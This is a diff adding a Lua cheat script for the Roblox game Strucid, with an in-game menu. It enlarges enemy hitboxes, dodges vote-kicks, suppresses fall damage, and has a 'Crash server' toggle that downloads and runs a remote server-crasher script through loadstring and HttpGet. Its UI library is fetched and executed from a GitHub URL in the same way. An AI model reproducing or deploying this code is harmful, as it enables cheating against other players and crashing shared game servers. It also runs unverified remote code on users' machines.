@@ -1,0 +1,126 @@
+
+-- Lib
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/MercyfulSmoked/localhub/main/tester')))();
+local fl = OrionLib.Flags
+
+local win = OrionLib:MakeWindow({Name = "Strucid", HidePremium = true,  IntroEnabled = false});
+
+local lt = win:MakeTab({Name = "Legit",Icon = "", PremiumOnly = false});
+local rt = win:MakeTab({Name = "Rage",Icon = "", PremiumOnly = false});
+local mm = win:MakeTab({Name = "Misc",Icon = "", PremiumOnly = false});
+
+-- Variables
+local lp = game.Players.LocalPlayer;
+local Players = game:GetService("Players");
+local TweenService = game:GetService("TweenService");
+
+local Mouse = lp:GetMouse();
+
+-- Functions
+local functions = {}
+
+function getchar()
+    if lp.Character and not lp.Character:GetAttribute("IsMenuChar") then
+        return lp.Character
+    end;
+end;
+
+function getflag(t)
+    return fl[t].Value
+end;
+-- Legit
+
+function functions.extend_hitbox(t)
+    if (not t) then return end;
+
+    local function extend()
+        local lp = game.Players.LocalPlayer
+        local slideExtend = getflag("slideextend")
+        for _, player in ipairs(game.Players:GetChildren()) do
+            if player ~= lp and player.Character and player.Character:FindFirstChild("Head") then
+                local vhrp = player.Character[getflag("Part")]
+                if game.PlaceId == 3606833500 or player.Team ~= lp.Team then
+                    if vhrp.Name == "Head" and slideExtend > 5 then
+                        vhrp.Size = Vector3.new(5,5,5)
+                    else
+                        vhrp.Size = Vector3.new(slideExtend, slideExtend, slideExtend)
+                    end;
+                    vhrp.Transparency = 0.5
+                    vhrp.Color = Color3.new(getflag("Color").R, getflag("Color").G, getflag("Color").B)
+                    print(vhrp.Color)
+                end
+            end
+        end
+    end    
+
+    while task.wait() and getflag("Extender") do
+        pcall(function()
+            extend()
+        end)
+    end;
+end;
+
+function functions.Crasher(t)
+    if not t then return end
+    loadstring(game:HttpGet(('https://raw.githubusercontent.com/Ihaveash0rtnamefordiscord/Releases/main/Strucid_ServerCrasher')))(' Watermelon ? ')
+end;
+
+function functions.AntiKick(t)
+    if not t then return end
+
+    local function getui()
+        if string.find(lp.PlayerGui.MenuUI.VoteKick.Title,Text, lp.Name) then 
+            game:GetService("TeleportService"):Teleport(game.PlaceId, lp)
+        end;
+    end;
+
+    while task.wait() and t do
+        pcall(function()
+            getui()
+        end);
+    end;
+end;
+
+function functions.NoFall(t)
+    if not t then return end;
+
+    while task.wait(0.2) and getflag("NOFD") do 
+        if not lp.Character:FindFirstChild("LowerTorso"):FindFirstChild("BouncerTrail") then
+            require(game.ReplicatedStorage.Modules.NetworkModule2):FireServer("Bouncing")
+        end
+    end;
+end;
+
+-- Rage
+
+
+
+-- Misc
+
+
+-- Hooks
+
+
+-- Legit
+
+lt:AddDropdown({Name = "Part to hit", Default = "Head" ,Options = {"Head","HumanoidRootPart"}, Flag = "Part", Callback = function() end})
+
+lt:AddToggle({Name = "Extend Hitbox", Default = false, Flag = "Extender", Callback = functions.extend_hitbox});
+
+lt:AddSlider({Name = "Extending Size", Min = 1, Max = 20, Default = 5, Color = Color3.fromRGB(255,255,255), Increment = 1, Flag = "slideextend", Callback = function(t) end})
+
+lt:AddColorpicker({Name = "Color of hitbox", Default = Color3.fromRGB(0,0,0), Flag = "Color", Callback = function(t) end})
+
+-- Rage
+
+
+-- Misc
+
+mm:AddToggle({Name = "Crash server (Spawn in)", Default = false, Flag = "Crasher", Callback = functions.Crasher});
+
+mm:AddToggle({Name = "No Fall Damage", Default = false, Flag = "NOFD", Callback = functions.NoFall});
+
+mm:AddToggle({Name = "Anti-Kick", Default = true, Flag = "Antikick", Callback = functions.AntiKick});
+
+OrionLib:Init()
+
